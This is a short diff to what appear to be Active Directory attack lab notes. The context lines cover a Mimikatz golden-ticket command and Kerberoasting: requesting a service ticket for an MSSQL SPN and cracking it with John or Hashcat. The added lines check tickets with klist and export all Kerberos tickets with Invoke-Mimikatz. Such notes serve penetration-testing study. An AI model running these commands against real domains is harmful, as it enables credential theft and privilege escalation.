@@ -570,3 +570,8 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
   - `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"`
 
 - `Request-SPNTicket` from PowerView can be used as well for cracking with John or Hashcat.
+
+- Check if the TGS has been granted
+  - `klist`
+- Export all tickets using Mimikatz
+  -  `Invoke-Mimikatz -Command '"kerberos::list /export"'`
